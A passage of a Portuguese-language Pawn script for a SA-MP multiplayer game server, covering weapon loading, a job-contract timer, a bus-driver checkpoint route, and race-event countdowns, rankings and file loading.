	if(WE_GetInt(gFile, "TacoBilhar") == 1)
	{
		GivePlayerWeapon(playerid, 7, 1); // Taco de Bilhar
	}
	if(WE_GetInt(gFile, "Katana") == 1)
	{
		GivePlayerWeapon(playerid, 8, 1); // Katana
	}
	if(WE_GetInt(gFile, "SerraEletrica") == 1)
	{
		GivePlayerWeapon(playerid, 9, 1); // Serra Eletrica
	}
	if(WE_GetInt(gFile, "Spray") == 1)
	{
		GivePlayerWeapon(playerid, 41, 1000); // Spray
	}
	if(WE_GetInt(gFile, "Camera") == 1)
	{
		GivePlayerWeapon(playerid, 43, 100); // Camêra
	}
	if(WE_GetInt(gFile, "Paraquedas") == 1)
	{
		GivePlayerWeapon(playerid, 46, 1); // Paraquedas
	}
	return 1;
}

forward MensagemContrato(playerid);
public MensagemContrato(playerid)
{
	if(ContratoMsg[playerid] <= 0)
	{
	    KillTimer(T_Contratado[playerid]);
	    SendClientMessage(playerid, COR_ERRO, "Você demorou muito para responder e o convite foi automaticamente cancelado.");
	    SendClientFormat(DonoEmpresa[playerid], COR_ERRO, "%s demorou muito para responder e o convite foi automaticamente cancelado.", PlayerName(playerid));
	    AceitarContrato[playerid] = 0;
	    ContratoMsg[playerid] = 0;
	    return 1;
	}
	else if(ContratoMsg[playerid] > 0)
	{
	    SendClientFormat(playerid, AZUL_WE, "%s está oferecendo um contrato para você trabalhar na empresa dele. (/Aceitar | /Recusar)", PlayerName(DonoEmpresa[playerid]));
	    SendClientFormat(DonoEmpresa[playerid], -1, "Aguarde a resposta de %s para saber se ele(a) irá aceitar trabalhar na sua empresa.", PlayerName(playerid));
    	T_Contratado[playerid] = SetTimerEx("MensagemContrato", 3000, false, "d", playerid);
    	ContratoMsg[playerid] --;
    	return 1;
	}
	return 1;
}

stock TrailerNoRespawn(vehicleid)
{
    if(IsVehicleOccupied(vehicleid))
	{
	    foreach(Player, i)
	    {
			if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(i)))
			{
				new
					Float:gvehx, Float:gvehy, Float:gvehz
				;
				GetPlayerPos(i, gvehx, gvehy, gvehz);

				for(new v = 0; v < MAX_VEHICLES; v++)
				{
					if(VehicleToPoint(10.0, i, gvehx, gvehy, gvehz))
					{
					    return 0;
					}
				}
			}
		}
	}
	return 1;
}

forward VehicleToPoint(Float:radi, vehicleid, Float:x, Float:y, Float:z);
public VehicleToPoint(Float:radi, vehicleid, Float:x, Float:y, Float:z)
{
	new
		Float:oldposx, Float:oldposy, Float:oldposz,
		Float:tempposx, Float:tempposy, Float:tempposz
	;
	GetVehiclePos(vehicleid, oldposx, oldposy, oldposz);
	tempposx = (oldposx -x);
	tempposy = (oldposy -y);
	tempposz = (oldposz -z);
	if(((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
	{
		return 1;
	}
	return 0;
}

forward TempoRotaBus(playerid);
public TempoRotaBus(playerid)
{
    if(tempoBus[playerid] <= 0)
    {
        GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~p~~h~Concluido~n~~y~~h~Proximo ponto.", 2000, 5);
        TogglePlayerControllable(playerid, true);
        CheckPontoBus(playerid);
        return 1;
    }
	if(tempoBus[playerid] > 0)
	{
	    tempoBus[playerid] --;
	    timerBus[playerid] = SetTimerEx("TempoRotaBus", 1000, false, "d", playerid);
        TogglePlayerControllable(playerid, false);
        GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~p~Aguarde...", 1000, 5);
        return 1;
	}
	return 1;
}

forward CheckPontoBus(playerid);
public CheckPontoBus(playerid)
{
	if(RotaBus[playerid] <= 0)
	{
		PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
		SendClientMessage(playerid, COR_MOTORISTABUS, "Rota iniciada siga a rota de acordo com os pontos.");
		SendClientMessage(playerid, COR_MOTORISTABUS, "Próxima parada de ida número 1.");
		RotaBus[playerid] = 1;
		SetPlayerMapIcon(playerid, 90, 2256.3203,-1661.4934,15.3698, 5,0,MAPICON_GLOBAL_CHECKPOINT);
	}
	else if(RotaBus[playerid] == 1 && PlayerToPoint(4.0, playerid, 2256.3203,-1661.4934,15.3698))
	{
		PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
		SendClientMessage(playerid, COR_MOTORISTABUS, "Rota iniciada siga a rota de acordo com os pontos.");
		SendClientMessage(playerid, COR_MOTORISTABUS, "Próxima parada de ida número 2.");
  		RotaBus[playerid] = 2;
  		SetPlayerMapIcon(playerid, 90, 2115.1814,-1104.6848,25.2017, 5,0,MAPICON_GLOBAL_CHECKPOINT);
	}
	else if(RotaBus[playerid] == 2 && PlayerToPoint(4.0, playerid, 2115.1814,-1104.6848,25.2017))
	{
		PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
		SendClientMessage(playerid, COR_MOTORISTABUS, "Rota iniciada siga a rota de acordo com os pontos.");
		SendClientMessage(playerid, COR_MOTORISTABUS, "Próxima parada de ida número 3.");
  		RotaBus[playerid] = 3;
  		SetPlayerMapIcon(playerid, 90, 1621.5017,-1157.4521,24.0429, 5,0,MAPICON_GLOBAL_CHECKPOINT);
	}
	else if(RotaBus[playerid] == 3 && PlayerToPoint(4.0, playerid, 1621.5017,-1157.4521,24.0429))
	{
		PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
		SendClientMessage(playerid, COR_MOTORISTABUS, "Rota iniciada siga a rota de acordo com os pontos.");
		SendClientMessage(playerid, COR_MOTORISTABUS, "Próxima parada de ida número 4.");
  		RotaBus[playerid] = 4;
  		SetPlayerMapIcon(playerid, 90, 1526.3484,-1656.8674,13.4729, 5,0,MAPICON_GLOBAL_CHECKPOINT);
	}
	else if(RotaBus[playerid] == 4 && PlayerToPoint(4.0, playerid, 1526.3484,-1656.8674,13.4729))
	{
		PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
		SendClientMessage(playerid, COR_MOTORISTABUS, "Rota iniciada siga a rota de acordo com os pontos.");
		SendClientMessage(playerid, COR_MOTORISTABUS, "Próxima parada de ida número 5.");
  		RotaBus[playerid] = 5;
  		SetPlayerMapIcon(playerid, 90, 1544.2247,-1735.4967,13.4814, 5,0,MAPICON_GLOBAL_CHECKPOINT);
	}
	else if(RotaBus[playerid] == 5 && PlayerToPoint(4.0, playerid, 1544.2247,-1735.4967,13.4814))
	{
		PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
		SendClientMessage(playerid, COR_MOTORISTABUS, "Rota iniciada siga a rota de acordo com os pontos.");
		SendClientMessage(playerid, COR_MOTORISTABUS, "Próxima parada de ida número 6.");
  		RotaBus[playerid] = 6;
  		SetPlayerMapIcon(playerid, 90, 1752.8140,-1683.3641,13.4934, 5,0,MAPICON_GLOBAL_CHECKPOINT);
	}
	else if(RotaBus[playerid] == 6 && PlayerToPoint(4.0, playerid, 1752.8140,-1683.3641,13.4934))
	{
		PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
		SendClientMessage(playerid, COR_MOTORISTABUS, "Rota iniciada siga a rota de acordo com os pontos.");
		SendClientMessage(playerid, COR_MOTORISTABUS, "Próxima parada de ida número 7.");
		RotaBus[playerid] = 7;
		SetPlayerMapIcon(playerid, 90, 1818.4862,-1669.9175,13.4754, 5,0,MAPICON_GLOBAL_CHECKPOINT);
	}
	else if(RotaBus[playerid] == 7 && PlayerToPoint(4.0, playerid, 1818.4862,-1669.9175,13.4754))
	{
		PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
		SendClientMessage(playerid, COR_MOTORISTABUS, "Rota iniciada siga a rota de acordo com os pontos.");
		SendClientMessage(playerid, COR_MOTORISTABUS, "Próxima parada de ida número 8.");
		RotaBus[playerid] = 8;
		SetPlayerMapIcon(playerid, 90, 1917.3300,-1755.5229,13.4842, 5,0,MAPICON_GLOBAL_CHECKPOINT);
	}
 	else if(RotaBus[playerid] == 8 && PlayerToPoint(4.0, playerid, 1917.3300,-1755.5229,13.4842))
	{
		PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
		SendClientMessage(playerid, COR_MOTORISTABUS, "Rota iniciada siga a rota de acordo com os pontos.");
		SendClientMessage(playerid, COR_MOTORISTABUS, "Próxima parada de ida número 9.");
		RotaBus[playerid] = 9;
		SetPlayerMapIcon(playerid, 90, 1250.3429,-1848.7618,13.4829, 5,0,MAPICON_GLOBAL_CHECKPOINT);
	}
	else if(RotaBus[playerid] == 9 && PlayerToPoint(4.0, playerid, 1250.3429,-1848.7618,13.4829)) // Agência
	{
		PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
		SendClientMessage(playerid, COR_MOTORISTABUS, "Rota iniciada siga a rota de acordo com os pontos.");
		SendClientMessage(playerid, COR_MOTORISTABUS, "Próxima parada de ida número 10 ponto final para o retorno.");
		RotaBus[playerid] = 10;
		SetPlayerMapIcon(playerid, 90, 825.0601,-1980.0784,12.9687, 5,0,MAPICON_GLOBAL_CHECKPOINT);
	}
	else if(RotaBus[playerid] == 10 && PlayerToPoint(4.0, playerid, 825.0601,-1980.0784,12.9687))
	{
		PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
		SendClientMessage(playerid, COR_MOTORISTABUS, "Rota iniciada siga a rota de acordo com os pontos.");
		SendClientMessage(playerid, COR_MOTORISTABUS, "Próxima parada de agora é de volta número 1.");
		RotaBus[playerid] = 11;
		GameTextForPlayer(playerid, "~h~~y~RETORNO ~<~", 1000, 0);
		SetPlayerMapIcon(playerid, 90, 847.7102,-2040.0093,12.9671, 5,0,MAPICON_GLOBAL_CHECKPOINT);
	}
	/* Volta */
	else if(RotaBus[playerid] == 11 && PlayerToPoint(4.0, playerid, 847.7102,-2040.0093,12.9671))
	{
		PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
		SendClientMessage(playerid, COR_MOTORISTABUS, "Rota iniciada siga a rota de acordo com os pontos.");
		SendClientMessage(playerid, COR_MOTORISTABUS, "Próxima parada de retorno número 2.");
		RotaBus[playerid] = 12;
		SetPlayerMapIcon(playerid, 90, 1243.0824,-1855.4192,13.4824, 5,0,MAPICON_GLOBAL_CHECKPOINT);
	}
	else if(RotaBus[playerid] == 12 && PlayerToPoint(4.0, playerid, 1243.0824,-1855.4192,13.4824))
	{
		PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
		SendClientMessage(playerid, COR_MOTORISTABUS, "Rota iniciada siga a rota de acordo com os pontos.");
		SendClientMessage(playerid, COR_MOTORISTABUS, "Próxima parada de retorno número 3.");
		RotaBus[playerid] = 13;
		SetPlayerMapIcon(playerid, 90, 1926.1702,-1749.0797,13.4911, 5,0,MAPICON_GLOBAL_CHECKPOINT);
	}
	else if(RotaBus[playerid] == 13 && PlayerToPoint(4.0, playerid, 1926.1702,-1749.0797,13.4911))
	{
		PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
		SendClientMessage(playerid, COR_MOTORISTABUS, "Rota iniciada siga a rota de acordo com os pontos.");
		SendClientMessage(playerid, COR_MOTORISTABUS, "Próxima parada de retorno número 4.");
		RotaBus[playerid] = 14;
		SetPlayerMapIcon(playerid, 90, 1824.9238,-1677.8073,13.4836, 5,0,MAPICON_GLOBAL_CHECKPOINT);
	}
	else if(RotaBus[playerid] == 14 && PlayerToPoint(4.0, playerid, 1824.9238,-1677.8073,13.4836))
	{
		PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
		SendClientMessage(playerid, COR_MOTORISTABUS, "Rota iniciada siga a rota de acordo com os pontos.");
		SendClientMessage(playerid, COR_MOTORISTABUS, "Próxima parada de retorno número 5.");
		RotaBus[playerid] = 15;
		SetPlayerMapIcon(playerid, 90, 1747.0201,-1671.4779,13.4862, 5,0,MAPICON_GLOBAL_CHECKPOINT);
	}
	else if(RotaBus[playerid] == 15 && PlayerToPoint(4.0, playerid, 1747.0201,-1671.4779,13.4862))
	{
		PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
		SendClientMessage(playerid, COR_MOTORISTABUS, "Rota iniciada siga a rota de acordo com os pontos.");
		SendClientMessage(playerid, COR_MOTORISTABUS, "Próxima parada de retorno número 6.");
		RotaBus[playerid] = 16;
		SetPlayerMapIcon(playerid, 90, 1561.2845,-1729.1694,13.4715, 5,0,MAPICON_GLOBAL_CHECKPOINT);
	}
 	else if(RotaBus[playerid] == 16 && PlayerToPoint(4.0, playerid, 1561.2845,-1729.1694,13.4715))
	{
		PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
		SendClientMessage(playerid, COR_MOTORISTABUS, "Rota iniciada siga a rota de acordo com os pontos.");
		SendClientMessage(playerid, COR_MOTORISTABUS, "Próxima parada de retorno número 7.");
		RotaBus[playerid] = 17;
		SetPlayerMapIcon(playerid, 90, 1532.6726,-1664.8820,13.4726, 5,0,MAPICON_GLOBAL_CHECKPOINT);
	}
	else if(RotaBus[playerid] == 17 && PlayerToPoint(4.0, playerid, 1532.6726,-1664.8820,13.4726))
	{
		PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
		SendClientMessage(playerid, COR_MOTORISTABUS, "Rota iniciada siga a rota de acordo com os pontos.");
		SendClientMessage(playerid, COR_MOTORISTABUS, "Próxima parada de retorno número 8.");
		RotaBus[playerid] = 18;
		SetPlayerMapIcon(playerid, 90, 1611.8562,-1164.1149,24.0053, 5,0,MAPICON_GLOBAL_CHECKPOINT);
	}
	else if(RotaBus[playerid] == 18 && PlayerToPoint(4.0, playerid, 1611.8562,-1164.1149,24.0053))
	{
		PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
		SendClientMessage(playerid, COR_MOTORISTABUS, "Rota iniciada siga a rota de acordo com os pontos.");
		SendClientMessage(playerid, COR_MOTORISTABUS, "Próxima parada de retorno número 9.");
		RotaBus[playerid] = 19;
		SetPlayerMapIcon(playerid, 90, 2106.2905,-1109.0166,25.1599, 5,0,MAPICON_GLOBAL_CHECKPOINT);
	}
	else if(RotaBus[playerid] == 19 && PlayerToPoint(4.0, playerid, 2106.2905,-1109.0166,25.1599))
	{
		PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
		SendClientMessage(playerid, COR_MOTORISTABUS, "Rota iniciada siga a rota de acordo com os pontos.");
		SendClientMessage(playerid, COR_MOTORISTABUS, "Próxima parada de retorno número 10.");
		RotaBus[playerid] = 20;
		SetPlayerMapIcon(playerid, 90, 2268.6394,-1655.6854,15.2715, 5,0,MAPICON_GLOBAL_CHECKPOINT);
	}
	else if(RotaBus[playerid] == 20 && PlayerToPoint(4.0, playerid, 2268.6394,-1655.6854,15.2715))
	{
		PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
		SendClientMessage(playerid, COR_MOTORISTABUS, "Próxima rota final, volte para área dos Motoristas de Ônibus.");
		SendClientMessage(playerid, COR_AMARELO, "Próxima parada de retorno FINAL.");
		RotaBus[playerid] = 21;
		SetPlayerMapIcon(playerid, 90, 2278.4102, -2329.2820, 13.5469, 5,0,MAPICON_GLOBAL_CHECKPOINT);
	}
	return 1;
}


stock CheckPontoBusPlayer(playerid)
{
	if(RotaBus[playerid] == 1 && !PlayerToPoint(4.0, playerid, 2256.3203,-1661.4934,15.3698))
	{
		SendClientMessage(playerid, COR_ERRO, "Você não está no ponto número 1!");
	}
	else if(RotaBus[playerid] == 2 && !PlayerToPoint(4.0, playerid, 2115.1814,-1104.6848,25.2017))
	{
		SendClientMessage(playerid, COR_ERRO, "Você não está no ponto número 2!");
	}
	else if(RotaBus[playerid] == 3 && !PlayerToPoint(4.0, playerid, 1621.5017,-1157.4521,24.0429))
	{
		SendClientMessage(playerid, COR_ERRO, "Você não está no ponto número 3!");
	}
	else if(RotaBus[playerid] == 4 && !PlayerToPoint(4.0, playerid, 1526.3484,-1656.8674,13.4729))
	{
		SendClientMessage(playerid, COR_ERRO, "Você não está no ponto número 4!");
	}
	else if(RotaBus[playerid] == 5 && !PlayerToPoint(4.0, playerid, 1544.2247,-1735.4967,13.4814))
	{
		SendClientMessage(playerid, COR_ERRO, "Você não está no ponto número 5!");
	}
	else if(RotaBus[playerid] == 6 && !PlayerToPoint(4.0, playerid, 1752.8140,-1683.3641,13.4934))
	{
		SendClientMessage(playerid, COR_ERRO, "Você não está no ponto número 6!");
	}
	else if(RotaBus[playerid] == 7 && !PlayerToPoint(4.0, playerid, 1818.4862,-1669.9175,13.4754))
	{
		SendClientMessage(playerid, COR_ERRO, "Você não está no ponto número 7!");
	}
 	else if(RotaBus[playerid] == 8 && !PlayerToPoint(4.0, playerid, 1917.3300,-1755.5229,13.4842))
	{
		SendClientMessage(playerid, COR_ERRO, "Você não está no ponto número 8!");
	}
	else if(RotaBus[playerid] == 9 && !PlayerToPoint(4.0, playerid, 1250.3429,-1848.7618,13.4829))
	{
		SendClientMessage(playerid, COR_ERRO, "Você não está no ponto número 9!");
	}
	else if(RotaBus[playerid] == 10 && !PlayerToPoint(4.0, playerid, 825.0601,-1980.0784,12.9687))
	{
		SendClientMessage(playerid, COR_ERRO, "Você não está no ponto número 10!"); // Final Ida
	}
	else if(RotaBus[playerid] == 11 && !PlayerToPoint(4.0, playerid, 847.7102,-2040.0093,12.9671)) // Começo Volta
	{
		SendClientMessage(playerid, COR_ERRO, "Você não está no ponto número 11!");
	}
	else if(RotaBus[playerid] == 12 && !PlayerToPoint(4.0, playerid, 1243.0824,-1855.4192,13.4824))
	{
		SendClientMessage(playerid, COR_ERRO, "Você não está no ponto número 12!");
	}
	else if(RotaBus[playerid] == 13 && !PlayerToPoint(4.0, playerid, 1926.1702,-1749.0797,13.4911))
	{
		SendClientMessage(playerid, COR_ERRO, "Você não está no ponto número 13!");
	}
	else if(RotaBus[playerid] == 14 && !PlayerToPoint(4.0, playerid, 1824.9238,-1677.8073,13.4836))
	{
		SendClientMessage(playerid, COR_ERRO, "Você não está no ponto número 14!");
	}
	else if(RotaBus[playerid] == 15 && !PlayerToPoint(4.0, playerid, 1747.0201,-1671.4779,13.4862))
	{
		SendClientMessage(playerid, COR_ERRO, "Você não está no ponto número 15!");
	}
 	else if(RotaBus[playerid] == 16 && !PlayerToPoint(4.0, playerid, 1561.2845,-1729.1694,13.4715))
	{
		SendClientMessage(playerid, COR_ERRO, "Você não está no ponto número 16!");
	}
	else if(RotaBus[playerid] == 17 && !PlayerToPoint(4.0, playerid, 1532.6726,-1664.8820,13.4726))
	{
		SendClientMessage(playerid, COR_ERRO, "Você não está no ponto número 17!");
	}
	else if(RotaBus[playerid] == 18 && !PlayerToPoint(4.0, playerid, 1611.8562,-1164.1149,24.0053))
	{
		SendClientMessage(playerid, COR_ERRO, "Você não está no ponto número 18!");
	}
	else if(RotaBus[playerid] == 19 && !PlayerToPoint(4.0, playerid, 2106.2905,-1109.0166,25.1599))
	{
		SendClientMessage(playerid, COR_ERRO, "Você não está no ponto número 19!");
	}
	else if(RotaBus[playerid] == 20 && !PlayerToPoint(4.0, playerid, 2268.6394,-1655.6854,15.2715))
	{
		SendClientMessage(playerid, COR_ERRO, "Você não está no ponto número 20!");
	}
	else
	{
	    tempoBus[playerid] = 5;
		SendClientMessage(playerid, COR_AMARELO, "Liberado aguarde...");
		GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~p~Aguarde...", 1000, 5);
		timerBus[playerid] = SetTimerEx("TempoRotaBus", 1000, false, "d", playerid);
		TogglePlayerControllable(playerid, false);
	}
}

/*
stock IsValidNick(nick[]) // By: Drakon
{
	for(new i; nick[i]; ++i) switch(nick[i])
	{
		case 'A' .. 'Z', 'a' .. 'z', '_', '[', ']', '(', ')', '.', 'R$', '@', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0': continue;
		default: return false;
	}
	return true;
}*/

/*stock IsValidNick(nick[]) // By: Drakon
{
	for(new i; nick[i]; ++i) switch(nick[i])
	{
		case 'A' .. 'Z', 'a' .. 'z', '_', '.', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0': continue;
		default: return false;
	}
	return true;
}*/

/*stock IsValidFrase(nick[])
{
	for(new i; nick[i]; ++i) switch(nick[i])
	{
		case 'A' .. 'Z', 'a' .. 'z', ' ': continue;
		default: return false;
	}
	return true;
}*/

/*stock IsValidNickCla(nick[])
{
	for(new i; nick[i]; ++i) switch(nick[i])
	{
		case 'A' .. 'Z', 'a' .. 'z', '_', '.', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', ' ': continue;
		default: return false;
	}
	return true;
}*/

stock NotTrailerAtached(vehicle)
{
    foreach(Player, i)
    {
        new
			v = GetPlayerVehicleID(i)
		;
        if(IsPlayerInAnyVehicle(i) && GetVehicleModel(v) == 515)
        {
			if(vehicle == GetVehicleTrailer(GetPlayerVehicleID(i)))
			{
				return 0;
			}
		}
	}
	return 1;
}

forward OcultaLevel(playerid);
public OcultaLevel(playerid)
{
    TextDrawHideForPlayer(playerid, LevelEXP[playerid]);
	return 1;
}

stock minrand(min, max) // By Alex "Y_Less" Cole
{
    return random(max - min) + min;
}

forward TempoVolta(playerid);
public TempoVolta(playerid)
{
	if(ParticipandoEvento[playerid] == 1)
	{
	    if(Tempo_Volta[playerid] <= 0)
	    {
			SendClientMessage(playerid, COR_ERRO, "Você foi desclassificado do evento!");
			KillTimer(Volta[playerid]);
			SetPlayerPos(playerid, 1227.4470,-1817.2300,16.5938);
			SetCameraBehindPlayer(playerid);
			SetPlayerCheckPoint[playerid] = 0; ParticipandoEvento[playerid] = 0; vOcupou[playerid] = -1;
			DisablePlayerRaceCheckpoint(playerid);
			TextDrawHideForPlayer(playerid, text_Top5[0]);
			TextDrawHideForPlayer(playerid, text_Top5[1]);
			TogglePlayerControllable(playerid, true);
	        return 1;
	    }
		if(Tempo_Volta[playerid] > 0 && Tempo_Volta[playerid] <= 30)
		{
		    Tempo_Volta[playerid] --;
		    Volta[playerid] = SetTimerEx("TempoVolta", 1000, false, "d", playerid);
		    format(gStr, sizeof(gStr), "~n~~n~~n~~r~~h~Volte para o veiculo~n~~y~~h~Tempo %d", Tempo_Volta[playerid]);
			GameTextForPlayer(playerid, gStr, 1000, 5);
		}
	}
	return 1;
}

forward OnPlayerRaceCheckpoint(playerid, CPMaisMais);
public OnPlayerRaceCheckpoint(playerid, CPMaisMais)
{
	new
		CheckNormal
	;
	if(TipoCheckPoint == 1)
	{
		CheckNormal = 0;
	}
	else if(TipoCheckPoint == 2)
	{
		CheckNormal = 3;
	}
	if(CPMaisMais == UltimoCP-1)
	{
		SetPlayerRaceCheckpoint(playerid, 1, CheckPoint[SetPlayerCheckPoint[playerid]][0], CheckPoint[SetPlayerCheckPoint[playerid]][1], CheckPoint[SetPlayerCheckPoint[playerid]][2], CheckPoint[SetPlayerCheckPoint[playerid]][0], CheckPoint[SetPlayerCheckPoint[playerid]][1], CheckPoint[SetPlayerCheckPoint[playerid]][2], 8.0);
	}
 	else
 	{
	 	SetPlayerRaceCheckpoint(playerid, CheckNormal, CheckPoint[SetPlayerCheckPoint[playerid]][0], CheckPoint[SetPlayerCheckPoint[playerid]][1], CheckPoint[SetPlayerCheckPoint[playerid]][2], CheckPoint[SetPlayerCheckPoint[playerid]+1][0], CheckPoint[SetPlayerCheckPoint[playerid]+1][1], CheckPoint[SetPlayerCheckPoint[playerid]+1][2], 7.0);
	}
	return 1;
}

forward eContageme();
public eContageme()
{
    foreach(Player, i)
    {
		if(ParticipandoEvento[i] == 1)
		{
			if(ContagemRegressiva == 0)
			{
			   	T_AntBug = -1;
				format(gStr, sizeof(gStr), "%s", "~r~~h~VAI~w~! ~r~~h~VAI~w~! ~r~~h~VAI~w~!");
				TextDrawSetString(TextNumero, gStr);
				T_Rank = SetTimer("RankEvento", 1000, true);
				TextDrawShowForAll(TextNumero);
				PlayerPlaySound(i, 1057, 0.0, 0.0, 0.0);
				SetCameraBehindPlayer(i);
			}
			else
			{
				format(gStr, sizeof(gStr), "~r~~h~%d", ContagemRegressiva);
				TextDrawSetString(TextNumero, gStr);
				TextDrawShowForAll(TextNumero);
				ContagemRegressiva --;
				SetTimer("eContageme", 1000, false);
				PlayerPlaySound(i, 1056, 0.0, 0.0, 0.0);
				SetPlayerCamera(i);
			}
			return 1;
		}
	}
	return 1;
}

forward CongelarPlayers();
public CongelarPlayers()
{
	if(T_AntBug > 0)
	{
	 	foreach(Player, i)
	 	{
			if(ParticipandoEvento[i] == 1)
			{
		  		TogglePlayerControllable(i, false);
    			SetPlayerCamera(i);
			}
	    }
		SetTimer("CongelarPlayers", 1000, false);
	}
	if(T_AntBug < 0 || T_AntBug == -1)
	{
   		foreach(Player, i)
   		{
			if(ParticipandoEvento[i] == 1)
			{
		    	TogglePlayerControllable(i, true);
		    	SetCameraBehindPlayer(i);
			}
		}
		TextDrawHideForAll(TextNumero);
		SetTimer("ReprandoVeiculos", 1000, false);
	}
	return 1;
}

forward ReprandoVeiculos();
public ReprandoVeiculos()
{
    if(EventoCriado == 0)
    {
        return 1;
    }
    if(EventoCriado == 1)
    {
		foreach(Player, i)
		{
			if(ParticipandoEvento[i] == 1)
			{
				if(IsPlayerInAnyVehicle(i))
				{
					SetVehicleHealth(GetPlayerVehicleID(i), 1000);
				  	RepairVehicle(GetPlayerVehicleID(i));
				}
			}
		}
		SetTimer("ReprandoVeiculos", 1000, false);
	}
	return 1;
}

forward RankEvento();
public RankEvento()
{
	new
		playerScores[MAX_PLAYERS][rankingEnum],
		index
	;
	for(new i; i != MAX_PLAYERS; ++i)
	{
		if(IsPlayerConnected(i) && !IsPlayerNPC(i))
		{
			playerScores[index][player_Score] = SetPlayerCheckPoint[i];
			playerScores[index++][player_ID] = i;
		}
	}
	GetPlayerHighestScores(playerScores,0,index);
	new
		score_Text[256] = "~n~",
		player_Name[20]
	;
	for(new i; i < 5; ++i)
	{
		if(i < index)
		{
			GetPlayerName(playerScores[i][player_ID], player_Name, sizeof(player_Name));
			format(score_Text, sizeof(score_Text), "%s~n~~y~~h~%d - ~w~~w~%s", score_Text, i + 1, player_Name); // playerScores[i][player_Score]
		}
		else
			format(score_Text, sizeof(score_Text), "%s~n~~y~~h~%d - ~r~~h~Ninguem", score_Text, i + 1);
	}
	TextDrawSetString(text_Top5[1], score_Text);
	return 1;
}

stock SetPlayerCamera(playerid)
{
	new
		Float:iPosx,
		Float:iPosy,
		Float:iPosz,
		Float:iPosa = random(360)
	;
    GetPlayerPos(playerid, iPosx, iPosy, iPosz);
    SetPlayerCameraPos(playerid, iPosx - 20 * floatsin(-iPosa, degrees), iPosy - 20 * floatcos(-iPosa, degrees), iPosz + 7);
	SetPlayerCameraLookAt(playerid, iPosx, iPosy, iPosz);
}

stock CheckMaxRaceCheckPoints(playerid)
{
	do
	{
 		if(MaxCheck >= CheckID)
	    {
			break;
	    }
	    else MaxCheck ++;
	}
	while(MaxCheck < CheckID);
	SendClientMessage(playerid, -1, "");
	format(gStr, sizeof(gStr), " Evento com carregado com sucesso! (Total de %d checkpoints e o Total de %d veículos)", MaxCheck, VeiculosEvento); SendClientMessage(playerid, -1, gStr);
	SendClientMessage(playerid, -1, "");
	UltimoCP = MaxCheck;
	AlguemVenceu = 0;
}

stock GetPlayerHighestScores(array[][rankingEnum], left, right)
{
    new
        tempLeft = left,
        tempRight = right,
        pivot = array[(left + right) / 2][player_Score],
        tempVar
    ;
    while(tempLeft <= tempRight)
    {
        while(array[tempLeft][player_Score] > pivot) tempLeft++;
        while(array[tempRight][player_Score] < pivot) tempRight--;

        if(tempLeft <= tempRight)
        {
            tempVar = array[tempLeft][player_Score], array[tempLeft][player_Score] = array[tempRight][player_Score], array[tempRight][player_Score] = tempVar;
            tempVar = array[tempLeft][player_ID], array[tempLeft][player_ID] = array[tempRight][player_ID], array[tempRight] [player_ID] = tempVar;
            tempLeft ++, tempRight --;
        }
    }
    if(left < tempRight) GetPlayerHighestScores(array, left, tempRight);
    if(tempLeft < right) GetPlayerHighestScores(array, tempLeft, right);
}

stock carregarRace(playerid, arquivo[])
{
	static
		string[64]
	;
	new
		File:arquivoFopen = fopen(arquivo, io_read)
	;
	if(!fexist(arquivo))
	{
	    SendClientMessage(playerid, COR_ERRO, "Não existe nenhum evento salvo com esse nome!");
	    return 1;
	}
	CheckID = 0;
 	while(fread(arquivoFopen, string))
	{
	  	sscanf(string, "f <,>fff", CheckPoint[CheckID][0], CheckPoint[CheckID][1], CheckPoint[CheckID][2]);
		CheckID ++;
	}
	RemovePlayerMapIcon(playerid, 8);
	SetPlayerPos(playerid, CheckPoint[0][0], CheckPoint[0][1], CheckPoint[0][2]);
	SetPlayerRaceCheckpoint(playerid, 1, CheckPoint[0][0], CheckPoint[0][1], CheckPoint[0][2], CheckPoint[0][0], CheckPoint[0][1], CheckPoint[0][2], 10.0);
	SetPlayerMapIcon(playerid, 8, CheckPoint[1][0], CheckPoint[1][1], CheckPoint[1][2], 19,0,MAPICON_GLOBAL);
	format(gStr, sizeof(gStr), "(INFO) Evento %s carregado com sucesso! (Total CPS - %d)", arquivo, CheckID);
	SendClientMessage(playerid, 0x99CC66AA, gStr);
	SendClientMessage(playerid, 0x99CC66AA, "* Você foi setado até o local do evento e o primeiro CP foi stado como base!");
	return fclose(arquivoFopen);
}

stock carregarVeiculos(arquivo[])
{
	static
		string[64]
	;
	new
		File:arquivoFopen = fopen(arquivo, io_read)
	;
	if(!fexist(arquivo))
	{
	    return 1;
	}
	VeiculosEvento = 0;
 	while(fread(arquivoFopen, string))
	{
	    new
			modelo,
			vecolor = random(360)
		;
	  	sscanf(string, "p <,>ffffi", Posicao[VeiculosEvento][0], Posicao[VeiculosEvento][1], Posicao[VeiculosEvento][2], Posicao[VeiculosEvento][3], modelo);
